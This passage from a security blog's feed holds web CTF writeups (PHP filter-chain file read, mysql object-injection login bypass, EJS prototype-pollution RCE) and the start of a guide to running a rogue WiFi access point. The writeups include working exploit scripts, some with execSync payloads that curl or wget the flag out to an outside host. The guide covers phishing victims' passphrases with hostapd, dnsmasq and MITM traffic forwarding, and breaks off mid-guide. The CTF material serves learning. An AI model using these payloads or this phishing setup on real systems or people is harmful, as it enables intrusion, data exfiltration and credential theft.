R|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.base64-decode|convert.iconv.UCS-4.UCS-4LE|convert.base64-encode|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode|dechunk|convert.base64-decode|convert.base64-decode/resource=../../../flag.txt</div></code></div></pre><!-- HTML_TAG_END --><p>Using the payload on <code>file</code> parameter gives the flag:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>curl -i http://localhost/ --data 'file=PAYLOADHERE'</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"notey\"><a href=\"#notey\">Notey</a></h2><blockquote><p>I created a note sharing website for everyone to talk to themselves secretly. Don‚Äôt try to access others notes, grass isn‚Äôt greener :‚Äô( )</p></blockquote><p>Downloaded the source code and started reviewing the code. During the initial setup of the challenge, i faced one major issue and that was <code>pwnjail</code>. This was totally new to me.If you look at the <code>Dockerfile</code>, you would find this part:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>FROM pwn.red/jail</div><div class='line'>COPY --from=final / /srv</div><div class='line'>COPY docker-entrypoint.sh /srv/app/run</div><div class='line'>COPY hook.sh /jail/hook.sh</div><div class='line'>RUN chmod +x /srv/app/run /jail/hook.sh && </div><div class='line'>    touch /srv/flag.txt && chmod 777 /srv/flag.txt && </div><div class='line'>    echo \"127.0.0.1 debuerreotype localhost app\" &gt;&gt; /srv/etc/hosts</div><div class='line'>ENV JAIL_PIDS=0 JAIL_CPU=0 JAIL_MEM=0 JAIL_TIME=0 JAIL_TMP_SIZE=100M JAIL_DEV=null,zero,urandom</div></code></div></pre><!-- HTML_TAG_END --><p>With <code>pwnjail</code>, the problem is the <code>filesystem</code> state is maintained only for a few seconds and then its discarded. Or in other words, i can‚Äôt simply just do theexploitation steps manually by logging in and then using that token to do some other stuff. Because by the time, i would reach to second request, my token would havelong gone. </p><p>So, we need to write a script. But before jump into the script part. Lets explore the code to see where the vulnerability is. Coming from the point of <strong>Sources &amp; Sinks</strong>,first thing i noticed was extended url parameters:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>app.use(bodyParser.urlencoded(&#123;</div><div class='line'> extended: true</div><div class='line'>&#125;))</div></code></div></pre><!-- HTML_TAG_END --><p>The functions <code>signup</code>, <code>login</code> and <code>addNote</code> doesn‚Äôt seem to be vulnerable at because of the middleware <code>addNote</code> and <code>login</code>. Inside these middlewares, there‚Äôs a check forthe incoming data. The parameters have to be <code>strings</code>:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>...</div><div class='line'>else if(typeof content !== \"string\" || typeof note_secret !== \"string\")</div><div class='line'>&#123;</div><div class='line'>    return res.status(400).send(\"Wrong data format\");</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>The only potential function we are left with is <code>viewNote</code> function. This function doesn‚Äôt have any validation on incoming data. Lets have a close look:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>app.get('/viewNote', middleware.auth, (req, res) =&gt; &#123;</div><div class='line'>    const &#123; note_id,note_secret &#125; = req.query;</div><div class='line'></div><div class='line'>    if (note_id && note_secret)&#123;</div><div class='line'>        db.getNoteById(note_id, note_secret, (err, notes) =&gt; &#123;</div><div class='line'>            if (err) &#123;</div><div class='line'>            return res.status(500).json(&#123; error: 'Internal Server Error' &#125;);</div><div class='line'>            &#125;</div><div class='line'>            return res.json(notes);</div><div class='line'>        &#125;);</div><div class='line'>    &#125;</div><div class='line'>    else</div><div class='line'>    &#123;</div><div class='line'>        return res.status(400).json(&#123;\"Error\":\"Missing required data\"&#125;);</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>The parameters <code>note_id</code> and <code>note_secret</code> are passed to the function <code>getNoteById</code>. Jumping onto this function:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>function getNoteById(noteId, secret, callback) &#123;</div><div class='line'>  const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';</div><div class='line'>  console.log(noteId,secret);</div><div class='line'>  pool.query(query, [noteId,secret], (err, results) =&gt; &#123;</div><div class='line'>    if (err) &#123;</div><div class='line'>      console.error('Error executing query:', err);</div><div class='line'>      callback(err, null);</div><div class='line'>      return;</div><div class='line'>    &#125;</div><div class='line'>    callback(null, results);</div><div class='line'>  &#125;);</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>The parameters are directly passed to the <code>pool.query</code> function. This doesn‚Äôt seem to be directly vulnerable unless there‚Äôs a vulnerability in the <code>mysql</code> library we are using.Lets read the documentation of the library:<a href=\"https://www.npmjs.com/package/mysql\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">https://www.npmjs.com/package/mysql</a></p><p>From the documentation, this is what hit me:</p><blockquote><p>Objects are turned into <code>key = &#39;val&#39;</code> pairs for each enumerable property on the object. If the property‚Äôs value is a function, it is skipped; if the property‚Äôs value is an object, <code>toString()</code> is called on it and the returned value is used.</p></blockquote><p>Firing up a local terminal and testing the <code>mysql.format</code> function with a dictionary gives us the following query:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>mysql.format('select * from where id = ?', &#123;'hash': 'hash3liZer'&#125;)</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/79416bd0-ceab-48d2-b22a-73d961098075\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>GPT tells me its a valid chained expression. I found this good stackoverflow question on this:</p><p><a href=\"https://stackoverflow.com/questions/28952960/chained-comparisons-in-mysql-get-unexpected-result\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">https://stackoverflow.com/questions/28952960/chained-comparisons-in-mysql-get-unexpected-result</a></p><p>Reading this i realized i can do a limited SQLi where i can return the result of the query to be <code>true</code>. I tested this for a while and my final payload looked like:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>note_id=66&note_secret[note_id]=0</div></code></div></pre><!-- HTML_TAG_END --><p>I got the <code>note_id</code> from the database directly on <code>docker</code> container which is the <code>id</code> of the note that contains the flag. My final script looked like this:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>class FLAG:</div><div class='line'>    __URL = \"http://FLAG.playat.flagyard.com\"</div><div class='line'>    uu_username = \"hashish\"</div><div class='line'>    pp_password = \"hashish\"</div><div class='line'>    session = requests.Session()</div><div class='line'></div><div class='line'>    def signup(self):</div><div class='line'>        data = &#123;</div><div class='line'>            \"username\": self.uu_username,</div><div class='line'>            \"password\": self.pp_password</div><div class='line'>        &#125;</div><div class='line'>        response = self.session.post(f\"&#123;self.__URL&#125;/register\", data=data)</div><div class='line'>        if response.status_code == 200:</div><div class='line'>            print(f\"User &#123;self.uu_username&#125; with password &#123;self.pp_password&#125; created successfully\")</div><div class='line'>            return</div><div class='line'>        print(\"Error in signup: \", response.text)</div><div class='line'></div><div class='line'>    def login(self):</div><div class='line'>        data = &#123;</div><div class='line'>            \"username\": self.uu_username,</div><div class='line'>            \"password\": self.pp_password</div><div class='line'>        &#125;</div><div class='line'>        response = self.session.post(f\"&#123;self.__URL&#125;/login\", data=data)</div><div class='line'>        if response.status_code == 200:</div><div class='line'>            print(f\"User &#123;self.uu_username&#125; logged in successfully\")</div><div class='line'>            return</div><div class='line'>        raise Exception(f\"Failed to login &#123;response.text&#125;\")</div><div class='line'></div><div class='line'>    def view_note(self):</div><div class='line'>        payload = \"note_id=66&note_secret[note_id]=0\"</div><div class='line'>        response = self.session.get(f\"&#123;self.__URL&#125;/viewNote?&#123;data&#125;\")</div><div class='line'>        if response.status_code == 200:</div><div class='line'>            print(response.text)</div><div class='line'>            return</div><div class='line'>        raise Exception(f\"Failed to get note &#123;response.text&#125;\")</div><div class='line'></div><div class='line'>if __name__ == \"__main__\":</div><div class='line'>    ff = FLAG()</div><div class='line'>    ff.signup()</div><div class='line'>    ff.login()</div><div class='line'></div><div class='line'>    t = threading.Thread(</div><div class='line'>        target=ff.view_note</div><div class='line'>    )</div><div class='line'>    t.daemon = True</div><div class='line'>    t.start()</div><div class='line'></div><div class='line'>    time.sleep(5)</div></code></div></pre><!-- HTML_TAG_END --><p>Ran the script and got the flag on terminal. </p><h2 id=\"fastest-delivery-service\"><a href=\"#fastest-delivery-service\">Fastest Delivery Service</a></h2><blockquote><p>No time for description, I had some orders to deliver : DNote: The code provided is without jailing, please note that when writing exploits.</p></blockquote><p>Again, we are dealing with <code>pwnjail</code> here. So, we will need to write a script in order to fully exploit the instance URL. This challenge was basically inspired fromsome of the challenges that have been already given in other CTFs. We are dealing with a RCE here in EJS that can be exploited through prototype pollution. </p><p>Reading the <code>package.json</code> file, we know that <code>EJS</code> is being used here:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>\"dependencies\": &#123;</div><div class='line'>  \"express\": \"^4.18.2\",</div><div class='line'>  \"body-parser\": \"^1.20.1\",</div><div class='line'>  \"ejs\":\"^3.1.9\",</div><div class='line'>  \"express-session\":\"^1.18.0\"</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>Now, we need to find the entry point for prototype pollution here. Inspecing the source code, the <code>/register</code> endpoint writes the <code>username</code> to the <code>users</code> <code>Object</code>:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>app.post('/register', (req, res) =&gt; &#123;</div><div class='line'>    const &#123; username, password &#125; = req.body;</div><div class='line'></div><div class='line'>    if (Object.prototype.hasOwnProperty.call(users, username)) &#123;</div><div class='line'>        res.send('Username already exists. &lt;a href=\"/register\"&gt;Try a different username&lt;/a&gt;.');</div><div class='line'>    &#125; else &#123;</div><div class='line'>        users[username] = &#123; password, orders: [], address: '' &#125;;</div><div class='line'>        req.session.user = &#123; username &#125;;</div><div class='line'>        res.redirect(&#96;/address&#96;);</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>But the main question is how we are going to provide the payload to <code>username</code> <code>__proto__</code>. Looking further, we have the <code>/address</code> endpoint here: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>app.post('/address', (req, res) =&gt; &#123;</div><div class='line'>    const &#123; user &#125; = req.session;</div><div class='line'>    const &#123; addressId, Fulladdress &#125; = req.body;</div><div class='line'></div><div class='line'>    if (user && users[user.username]) &#123;</div><div class='line'>        addresses[user.username][addressId] = Fulladdress;</div><div class='line'>        users[user.username].address = addressId;</div><div class='line'>        res.redirect('/login');</div><div class='line'>    &#125; else &#123;</div><div class='line'>        res.redirect('/register');</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>This function can be exploited to provide the values to the <code>__proto__</code> parameter on <code>users</code> object. But before we head to exploit, we need to understand the vulnerability in EJS.I found a couple writeups on this here: </p><p><a href=\"https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</a></p><p>Reading this, i got that we need to introduce 2 values on the <code>prototype</code> of object which are:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>client=1</div><div class='line'>escape=1;return process.mainModule.require(\"child_process\").execSync(\"wget https://www.google.com/$(cat /tmp/flag*)\")</div></code></div></pre><!-- HTML_TAG_END --><p>We can exploit this challenge in 3 steps:</p><ul><li>Register a user with <code>__proto__</code> username.</li><li>Set the address with <code>addressId</code> as <code>client</code> and <code>Fulladdress</code> as <code>1</code></li><li>Set the address with <code>addressId</code> as <code>escape</code> and <code>Fulladdress</code> as the payload.</li></ul><p>Here‚Äôs the final script i wrote and got the flag on my <code>webhook</code> after running it a few times:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>class FLAG:</div><div class='line'>    __URL = \"http://FLAG.playat.flagyard.com\"</div><div class='line'>    uu_username = \"hashish\"</div><div class='line'>    pp_password = \"hashish\"</div><div class='line'>    session = requests.Session()</div><div class='line'></div><div class='line'>    def signup(self):</div><div class='line'>        data = &#123;</div><div class='line'>            \"username\": '__proto__',</div><div class='line'>            \"password\": self.pp_password</div><div class='line'>        &#125;</div><div class='line'>        response = self.session.post(f\"&#123;self.__URL&#125;/register\", data=data)</div><div class='line'>        if response.status_code == 200:</div><div class='line'>            print(f\"Signed up successfully\")</div><div class='line'>            return</div><div class='line'>        print(\"Error in signup: \", response.text)</div><div class='line'>    </div><div class='line'>    def address(self):</div><div class='line'>        data = &#123;</div><div class='line'>            'addressId': 'client',</div><div class='line'>            'Fulladdress': '1'</div><div class='line'>        &#125;</div><div class='line'>        response = self.session.post(f\"&#123;self.__URL&#125;/address\", data=data)</div><div class='line'></div><div class='line'>    def address2(self):</div><div class='line'>        data = &#123;</div><div class='line'>            'addressId': 'escape',</div><div class='line'>            'Fulladdress': '1;return process.mainModule.require(\"child_process\").execSync(\"curl https://webhookurl/$(cat /tmp/flag*)\")'</div><div class='line'>        &#125;</div><div class='line'>        response = self.session.post(f\"&#123;self.__URL&#125;/address\", data=data)</div><div class='line'></div><div class='line'>if __name__ == \"__main__\":</div><div class='line'>    ff = FLAG()</div><div class='line'>    ff.signup()</div><div class='line'></div><div class='line'>    t = threading.Thread(target=ff.address)</div><div class='line'>    t.daemon = True</div><div class='line'>    t.start()</div><div class='line'></div><div class='line'>    t = threading.Thread(target=ff.address2)</div><div class='line'>    t.daemon = True</div><div class='line'>    t.start()</div><div class='line'></div><div class='line'>    time.sleep(5)</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeups for all web related challenges from Blackhat MEA 2024 CTF","image":"https://github.com/user-attachments/assets/07220c38-8cb9-4961-b1c2-7020b0baa0ad","date_published":"2024-09-04T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.282Z","tags":["blackhatmea-2024","qualifiers"],"_indieweb":{"type":"article"}},{"id":"blog/2023/setup-fake-rogue-access-point-hostapd","url":"https://blog.shameerkashif.me/blog/2023/setup-fake-rogue-access-point-hostapd","title":"Setup Fake (Rogue) Access Point WiFi using HostAPD","content_html":"<p><strong>In this guide, i‚Äôll try my best to explain how one can use Fake (Rogue) Access Point to phish passphrases and other important target details over the air by showing targets a fabricated document. We will using using hostapd, a well-written ad-hoc software. A Rogue (Fake) Access Point is hosted to tempt and influence users to add their details on some page.</strong></p><p>As this rogue network is under the control of attacker, this allows him to stage several types of attacks against the nodes.</p><p>Wireless protocols are greatly enhanced since 2003 after the evolution of WPA in the reign of WiFi protected Access. A Fake Access Point is simply a wireless network possessing most of the attributes, the target network comprised of. The more it looks factual and discharge strong signal strength over a reasonable distance, the more possibility there will exist of getting that particular task done.</p><p><img src=\"https://github.com/user-attachments/assets/7d5cf4dc-127e-4495-8ff5-13f9b39c80b6\" alt=\"rogueap\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h2 id=\"technical-terms\"><a href=\"#technical-terms\">Technical Terms</a></h2><h3 id=\"phishing\"><a href=\"#phishing\">Phishing</a></h3><p>Coerce or influence someone to perform unintentional tasks by showing a forged document or a falsified page is said to be the phishing way.</p><h3 id=\"wireless-adapter\"><a href=\"#wireless-adapter\">Wireless Adapter</a></h3><p>A perfect wireless adapter is the foremost neccassity of a fake wireless network. A card with support of promiscious mode and packet injection is required to operate it in monitor mode and send forged packets over the area. Another important thing is to operate it at a suplemental frequency though its not compulsory if the victim is roughly close to you. The Recommended one are:</p><ul><li>Alfa AWUSO36NH (Recommended, you can the change frequency)</li><li>TP-Link WN722N (Nice, doesn‚Äôt allow to change frequency, works fine with hostapd)</li><li>Panda 300Mbps (Slow speed, but provides great distance. Not so best)</li></ul><h3 id=\"is-it-effective\"><a href=\"#is-it-effective\">Is it Effective?</a></h3><p>As have already discussed, it‚Äôs effictiveness depend on illegitimacy of it‚Äôs structure and how it is desgined. The more it looks factual and authentic, the more coercive attack it will be.</p><h2 id=\"the-guide\"><a href=\"#the-guide\">The Guide</a></h2><h3 id=\"setup-environment\"><a href=\"#setup-environment\">Setup Environment</a></h3><p>Before, we take a head-start, this tutorial is written on the basis of Kali Rolling 2018.1 as the attacker OS while any other platform could be taken as a choice of victim.</p><p>Update the environment and install required packages. This will install hostapd and dnsmasq and will update apache2 web server.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo apt update</div><div class='line'>sudo apt install hostapd dnsmasq apache2</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/e0534b03-4cbc-4794-9b16-6dd34d353a4b\" alt=\"update\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"wireless-interface\"><a href=\"#wireless-interface\">Wireless Interface</a></h3><p>Get your wireless interface</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>ifconfig</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/8e8e9a29-9194-40ce-9311-c5e7a05e032c\" alt=\"iwconfig\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Find the adapter interface and put it in monitor mode. In my case the wireless interface is wlan1 as shown in the above screenshot. So,</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>airmon-ng start wlan1</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/608e513e-4ac1-4215-83b1-4f974ca1e6f3\" alt=\"airmon\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"fake--rogue-access-point\"><a href=\"#fake--rogue-access-point\">Fake / Rogue Access Point</a></h3><p>Now, create a new folder under the home directory for the network files and navigate to that directory. For now, let‚Äôs say fakeap is the directory.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>mkdir /root/fakeap</div><div class='line'>cd /root/fakeap</div></code></div></pre><!-- HTML_TAG_END --><p>Setup a new hostapd configuration file and write the following instructions into the file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano hostapd.conf</div></code></div></pre><!-- HTML_TAG_END --><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>interface=wlan1mon</div><div class='line'>driver=nl80211</div><div class='line'>ssid=[Fake AP Name] </div><div class='line'>hw_mode=g</div><div class='line'>channel=[Fake AP Channel]</div><div class='line'>macaddr_acl=0</div><div class='line'>ignore_broadcast_ssid=0</div></code></div></pre><!-- HTML_TAG_END --><p>Press CTRL+X and then y to it. Note these three parameters in the above configuration:</p><ul><li><code>interface</code>: Monitor mode Wireless Interface to use.</li><li><code>ssid</code>: Fake Access Point ESSID (name).</li><li><code>channel</code>: Fake AP Channel to operate on.</li></ul><p>Now, just initiate the fake access point:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>hostapd hostapd.conf</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/0e50cbad-cc22-442e-aba1-3a05e0d53744\" alt=\"hostapd\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"multiple-access-points-optional\"><a href=\"#multiple-access-points-optional\">Multiple Access Points (Optional)</a></h3><p>If you have multiple targets or you are willing to write a script for multiple targets, hostapd provides this support too. You can provide multiple virtual interfaces to operate multiple networks from a single wireless card at a time. Tough it would slow down the whole process and would cause some other network problems. The standard usage of this is to host 3 networks from a single card at a time.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>interface=wlan1mon</div><div class='line'>hw_mode=g</div><div class='line'>channel=6</div><div class='line'>country_code=US</div><div class='line'></div><div class='line'>#FIRSTAP</div><div class='line'>ssid=ap1</div><div class='line'>auth_algs=1</div><div class='line'>wpa=2</div><div class='line'>wpa_key_mgmt=WPA-PSK </div><div class='line'>rsn_pairwise=TKIP</div><div class='line'>wpa_passphrase=somepassword</div><div class='line'></div><div class='line'>#SECONDAP</div><div class='line'>bss=wlan2    # Interface for secondap</div><div class='line'>ssid=ap2</div></code></div></pre><!-- HTML_TAG_END --><quote>Make Sure to remove the comments from the configuration provided above or it will throw a syntax error.</quote><h3 id=\"dhcp\"><a href=\"#dhcp\">DHCP</a></h3><p>We have dnsmasq for this part. dnsmasq is a Dynamic Host Configuration Protocol (DHCP) server, with support of dns forwarder and some other network features. It certainly is fast and easier to modify. Open a new terminal and create a configuration file for dnsmasq.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano dnsmasq.conf</div></code></div></pre><!-- HTML_TAG_END --><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>interface=wlan1mon</div><div class='line'>dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h</div><div class='line'>dhcp-option=3,192.168.1.1</div><div class='line'>dhcp-option=6,192.168.1.1</div><div class='line'>server=8.8.8.8</div><div class='line'>log-queries</div><div class='line'>log-dhcp</div><div class='line'>listen-address=127.0.0.1</div></code></div></pre><!-- HTML_TAG_END --><p><strong>Note these paramters in the above instructions.</strong></p><ul><li><code>dhcp-range</code>: IP Range for network clients. 12h is the lease time.</li><li><code>dhcp-option=3</code>: Gateway IP for the networks.</li><li><code>dhcp-option=6</code>: DNS Server.</li><li><code>listen-address</code>: Bind DHCP to local IP.</li></ul><p>Assign the network Gateway and netmask to the interface and add the routing table.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0</div><div class='line'>route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1</div></code></div></pre><!-- HTML_TAG_END --><p>Now, start dnsmasq server protocol.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dnsmasq -C dnsmasq.conf -d</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/user-attachments/assets/540ae2f1-4855-499f-a783-86ce15f03d28\" alt=\"dnsmasq\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"traffic-forwarding\"><a href=\"#traffic-forwarding\">Traffic Forwarding</a></h3><p>Here, we will forward traffic from one interface to another, just in case you are eager to provide your victims Internet Access. This would help you perform various other Man-in-the-middel (MITM) attacks and hence, will increase the scope of your attack. After this, it would work most likely a functional wireless access point.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE</div><div class='line'>iptables --append FORWARD --in-interface wlan1mon -j ACCEPT</div></code></div></pre><!-- HTML_TAG_END --><p>Note these two parameters in the last two commands:</p><ul><li><code>--out-interface</code>: interface from where to forward traffic to wlan1mon, i.e eth0</li><li><code>--in-interface</code>: Interface to which traffic is being forwarded, i.e. wlan1mon</li></ul><p>Now, just one step to go..</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"mysql-storage\"><a href=\"#mysql-storage\">MySQL Storage</a></h3><p>Now, we are required a site storage to store what‚Äôs posted along the headers in the form fields. In the aireplay tutorial of setting up Rogue Access Point, we used a different approach to get the credentials. In fact, we sniffed the traffic travelling between the server and client to acheive our aim. But that didn‚Äôt store the password permanently. An alternative approach of that is using database. So, we will use MySQL. Open MySQL and execute the below commands blind-folded.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>mysql</div></code></div></pre><!-- HTML_TAG_END --><!-- HTML_TAG_START --><pre class=\"shiki material-default\" 